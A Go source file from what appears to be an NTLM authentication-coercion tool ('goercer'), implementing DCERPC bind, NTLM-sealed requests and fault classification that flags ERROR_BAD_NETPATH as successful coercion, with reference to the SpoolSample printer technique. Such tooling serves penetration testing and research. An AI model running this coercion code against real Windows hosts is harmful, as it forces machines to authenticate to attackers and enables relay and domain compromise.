package dcerpc

import (
	"bytes"
	"encoding/binary"
	"fmt"

	"goercer/internal/ntlm"
)

// DCERPC transfer syntax UUID (NDR), identical for all interfaces.
const ndrUUID = "8a885d04-1ceb-11c9-9fe8-08002b104860"

// Packet types (MS-RPCE 2.2.1.1).
const (
	TypeRequest = 0
	TypeFault   = 3
	TypeBind    = 11
	TypeBindAck = 12
	TypeBindNak = 13
	TypeAuth3   = 16
)

// PFC flags.
const (
	PfcFirstFrag = 0x01
	PfcLastFrag  = 0x02
)

// Auth types and levels.
const (
	AuthTypeNTLMSSP  = 10
	AuthLevelPrivacy = 6
)

// Error values surfaced to the coercer engine.
const (
	StatusAccessDenied = 0x5
	StatusBadNetPath   = 0x6f7
)

// Transport abstracts the SMB named-pipe handle so the packet layer can be
// exercised without a live connection. *smbxport.Pipe satisfies it.
type Transport interface {
	WriteFile(b []byte, offset uint64) (int, error)
	ReadFile(b []byte, offset uint64) (int, error)
}

// BindRequest builds a DCERPC Bind PDU carrying the NTLM Negotiate message.
func BindRequest(authType, authLevel byte, authContextID uint32, authValue []byte, uuid string, majorVer, minorVer uint16) []byte {
	buf := writeHeader(TypeBind, authValue, 1)
	binary.Write(buf, binary.LittleEndian, uint16(4280)) // Max xmit frag
	binary.Write(buf, binary.LittleEndian, uint16(4280)) // Max recv frag
	binary.Write(buf, binary.LittleEndian, uint32(0))    // Assoc group

	// Context list: 1 context.
	buf.WriteByte(1)
	buf.WriteByte(0)
	buf.WriteByte(0)
	buf.WriteByte(0)

	// Context item 0.
	binary.Write(buf, binary.LittleEndian, uint16(0)) // Context ID
	buf.WriteByte(1)                                  // Num transfer syntaxes
	buf.WriteByte(0)                                  // Reserved

	// Abstract syntax (interface UUID + version).
	buf.Write(ParseUUID(uuid))
	binary.Write(buf, binary.LittleEndian, majorVer)
	binary.Write(buf, binary.LittleEndian, minorVer)

	// Transfer syntax (NDR).
	buf.Write(ParseUUID(ndrUUID))
	binary.Write(buf, binary.LittleEndian, uint16(2))
	binary.Write(buf, binary.LittleEndian, uint16(0))

	// Pad to 4-byte boundary (0xFF, as impacket does).
	pad := pad4(buf.Len(), 0xFF)
	buf.Write(pad)

	buf.Write(authVerifier(authType, authLevel, 0, authContextID))
	buf.Write(authValue)

	return finalize(buf.Bytes())
}

// Auth3Request builds a DCERPC Auth3 PDU carrying the NTLM Authenticate msg.
func Auth3Request(authType, authLevel byte, authContextID uint32, authValue []byte) []byte {
	buf := writeHeader(TypeAuth3, authValue, 1)
	buf.Write([]byte{0, 0, 0, 0}) // 4 bytes padding before auth trailer
	buf.Write(authVerifier(authType, authLevel, 0, authContextID))
	buf.Write(authValue)
	return finalize(buf.Bytes())
}

// AuthenticatedRequest builds a DCERPC Request PDU with PKT_PRIVACY sealing.
// It encrypts the stub and appends the NTLM signature in the order required by
// Windows (encrypt stub, then sign using the continued RC4 stream).
func AuthenticatedRequest(a *ntlm.AUTH, opnum uint16, stub []byte) []byte {
	// Auth length is the 16-byte NTLM signature; writeHeader derives it from
	// the placeholder auth value passed here.
	buf := writeHeader(TypeRequest, make([]byte, 16), 2)

	// Alloc hint = stub length before padding.
	binary.Write(buf, binary.LittleEndian, uint32(len(stub)))
	binary.Write(buf, binary.LittleEndian, uint16(0))     // Context ID
	binary.Write(buf, binary.LittleEndian, uint16(opnum)) // Opnum

	// Padded stub (0xBB padding like impacket).
	stubPad := (4 - (len(stub) % 4)) % 4
	paddedStub := make([]byte, len(stub)+stubPad)
	copy(paddedStub, stub)
	for i := 0; i < stubPad; i++ {
		paddedStub[len(stub)+i] = 0xBB
	}

	stubStart := buf.Len()
	buf.Write(paddedStub)

	buf.Write(authVerifier(AuthTypeNTLMSSP, AuthLevelPrivacy, byte(stubPad), a.AuthContextID))
	sigPos := buf.Len()
	buf.Write(make([]byte, 16)) // Signature placeholder

	packet := buf.Bytes()
	setFragLen(packet, uint16(len(packet)))

	// CRITICAL ORDER: encrypt stub, then sign the plaintext packet.
	messageToSign := packet[:len(packet)-16]

	encryptedStub := make([]byte, len(paddedStub))
	a.ClientSealHandle.XORKeyStream(encryptedStub, paddedStub)
	verifier := a.Signature(messageToSign)

	copy(packet[stubStart:], encryptedStub)
	copy(packet[sigPos:], verifier)

	a.SeqNum++
	return packet
}

// Bind performs the full 3-way DCERPC authenticated bind over a Transport and
// populates a with the challenge, flags, auth context ID, and session keys.
func Bind(t Transport, a *ntlm.AUTH, uuid string, majorVer, minorVer uint16) error {
	negotiate := (ntlm.Negotiate{}).Build()
	a.NegotiateMsg = negotiate

	bindReq := BindRequest(AuthTypeNTLMSSP, AuthLevelPrivacy, 0+79231, negotiate, uuid, majorVer, minorVer)
	if _, err := t.WriteFile(bindReq, 0); err != nil {
		return fmt.Errorf("bind write failed: %w", err)
	}

	bindAck := make([]byte, 4096)
	n, err := t.ReadFile(bindAck, 0)
	if err != nil {
		return fmt.Errorf("bind read failed: %w", err)
	}
	bindAck = bindAck[:n]

	if len(bindAck) < 24 {
		return fmt.Errorf("bind response too short: %d", len(bindAck))
	}
	if bindAck[2] == TypeBindNak {
		reason := binary.LittleEndian.Uint32(bindAck[12:16])
		return fmt.Errorf("bind rejected (BindNak) reason 0x%x", reason)
	}
	if bindAck[2] != TypeBindAck {
		return fmt.Errorf("unexpected bind response type %d", bindAck[2])
	}

	// Extract auth trailer.
	authLen := binary.LittleEndian.Uint16(bindAck[10:12])
	if authLen == 0 {
		return fmt.Errorf("no auth data in BindAck")
	}
	fragLen := binary.LittleEndian.Uint16(bindAck[8:10])
	authTrailerStart := int(fragLen) - int(authLen) - 8
	if authTrailerStart < 24 || authTrailerStart+int(authLen)+8 > int(fragLen) {
		return fmt.Errorf("invalid auth trailer position")
	}

	a.AuthContextID = binary.LittleEndian.Uint32(bindAck[authTrailerStart+4 : authTrailerStart+8])
	challengeMsg := bindAck[authTrailerStart+8 : authTrailerStart+8+int(authLen)]
	a.ChallengeMsg = challengeMsg

	if len(challengeMsg) < 32 {
		return fmt.Errorf("challenge message too short")
	}
	a.Challenge = challengeMsg[24:32]
	a.Flags = binary.LittleEndian.Uint32(challengeMsg[20:24])

	authMsg := a.BuildAuthenticate(challengeMsg)
	auth3 := Auth3Request(AuthTypeNTLMSSP, AuthLevelPrivacy, a.AuthContextID, authMsg)
	if _, err := t.WriteFile(auth3, 0); err != nil {
		return fmt.Errorf("auth3 write failed: %w", err)
	}
	return nil
}

// Transaction sends a single authenticated request and returns the classified
// outcome. If the server responds with an error status it is returned as a
// FaultError so the engine can match against known coercion signals.
func Transaction(t Transport, a *ntlm.AUTH, opnum uint16, stub []byte) error {
	req := AuthenticatedRequest(a, opnum, stub)
	if _, err := t.WriteFile(req, 0); err != nil {
		return fmt.Errorf("request write failed: %w", err)
	}

	resp := make([]byte, 4096)
	n, err := t.ReadFile(resp, 0)
	if err != nil {
		return fmt.Errorf("request read failed: %w", err)
	}
	resp = resp[:n]

	if len(resp) < 24 {
		return fmt.Errorf("response too short: %d", len(resp))
	}

	if resp[2] == TypeFault {
		status := binary.LittleEndian.Uint32(resp[24:28])
		return &FaultError{Status: status}
	}
	return nil
}

// TransactWithResponse sends a request and returns the decrypted response stub
// bytes (after the 24-byte header), used by methods that need read-back data
// such as printer handle retrieval in SpoolSample.
func TransactWithResponse(t Transport, a *ntlm.AUTH, opnum uint16, stub []byte) ([]byte, error) {
	req := AuthenticatedRequest(a, opnum, stub)
	if _, err := t.WriteFile(req, 0); err != nil {
		return nil, fmt.Errorf("request write failed: %w", err)
	}

	resp := make([]byte, 4096)
	n, err := t.ReadFile(resp, 0)
	if err != nil {
		return nil, fmt.Errorf("request read failed: %w", err)
	}
	resp = resp[:n]

	if len(resp) < 24 {
		return nil, fmt.Errorf("response too short: %d", len(resp))
	}
	if resp[2] == TypeFault {
		status := binary.LittleEndian.Uint32(resp[24:28])
		return nil, &FaultError{Status: status}
	}

	fragLen := binary.LittleEndian.Uint16(resp[8:10])
	authLen := binary.LittleEndian.Uint16(resp[10:12])
	stubData := resp[24:]

	if authLen > 0 {
		authTrailerStart := int(fragLen) - int(authLen) - 8
		if authTrailerStart > 24 && authTrailerStart <= len(resp) {
			encryptedStub := resp[24:authTrailerStart]
			authPadLen := resp[authTrailerStart+2]
			if int(authPadLen) > 0 && int(authPadLen) < len(encryptedStub) {
				encryptedStub = encryptedStub[:len(encryptedStub)-int(authPadLen)]
			}
			decrypted := make([]byte, len(encryptedStub))
			a.ServerSealHandle.XORKeyStream(decrypted, encryptedStub)
			stubData = decrypted
		}
	}
	return stubData, nil
}

func writeHeader(packetType byte, authValue []byte, callID uint32) *bytes.Buffer {
	buf := bytes.NewBuffer(make([]byte, 0, 256))
	buf.WriteByte(5)                                               // Version major
	buf.WriteByte(0)                                               // Version minor
	buf.WriteByte(packetType)                                      // Packet type
	buf.WriteByte(PfcFirstFrag | PfcLastFrag)                      // Flags
	binary.Write(buf, binary.LittleEndian, uint32(0x10))           // Data representation
	binary.Write(buf, binary.LittleEndian, uint16(0))              // Frag length (placeholder)
	binary.Write(buf, binary.LittleEndian, uint16(len(authValue))) // Auth length
	binary.Write(buf, binary.LittleEndian, callID)                 // Call ID
	return buf
}

func authVerifier(authType, authLevel, padLen byte, contextID uint32) []byte {
	return []byte{
		authType, authLevel, padLen, 0,
		byte(contextID), byte(contextID >> 8), byte(contextID >> 16), byte(contextID >> 24),
	}
}

func pad4(n int, fill byte) []byte {
	p := (4 - (n % 4)) % 4
	out := make([]byte, p)
	for i := range out {
		out[i] = fill
	}
	return out
}

func setFragLen(packet []byte, l uint16) {
	binary.LittleEndian.PutUint16(packet[8:10], l)
}

func finalize(packet []byte) []byte {
	setFragLen(packet, uint16(len(packet)))
	return packet
}

// FaultError carries a DCERPC fault status so the caller can classify it
// (e.g. ACCESS_DENIED vs ERROR_BAD_NETPATH which indicates successful
// coercion).
type FaultError struct {
	Status uint32
}

func (e *FaultError) Error() string {
	if e.Status == StatusBadNetPath {
		return fmt.Sprintf("got ERROR_BAD_NETPATH (0x%x) - coercion likely triggered", e.Status)
	}
	if e.Status == StatusAccessDenied {
		return fmt.Sprintf("got fault 0x%x (ACCESS_DENIED)", e.Status)
	}
	return fmt.Sprintf("got fault 0x%x", e.Status)
}

// IsCoercionSuccess reports whether the fault status signals the target's
// failed callback attempt, which indicates the coercion worked.
func IsCoercionSuccess(err error) bool {
	if fe, ok := err.(*FaultError); ok {
		return fe.Status == StatusBadNetPath
	}
	return false
}

// IsAccessDenied reports whether the fault status indicates the operation
// lacked permission (typically on unpatched/blocked services).
func IsAccessDenied(err error) bool {
	if fe, ok := err.(*FaultError); ok {
		return fe.Status == StatusAccessDenied
	}
	return false
}

// ParseUUID converts a canonical UUID string into the on-wire little-endian
// DCERPC byte order.
func ParseUUID(s string) []byte {
	// Remove dashes.
	raw := make([]byte, 0, 32)
	for i := 0; i < len(s); i++ {
		if c := s[i]; c != '-' {
			raw = append(raw, c)
		}
	}
	// Decode hex pairs.
	u := make([]byte, 16)
	for i := 0; i < 16; i++ {
		hi := hexVal(raw[i*2])
		lo := hexVal(raw[i*2+1])
		u[i] = hi<<4 | lo
	}
	// Byte-swap the three integer fields to little-endian.
	out := make([]byte, 16)
	out[0], out[1], out[2], out[3] = u[3], u[2], u[1], u[0]
	out[4], out[5] = u[5], u[4]
	out[6], out[7] = u[7], u[6]
	copy(out[8:], u[8:])
	return out
}

func hexVal(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	}
	return 0
}
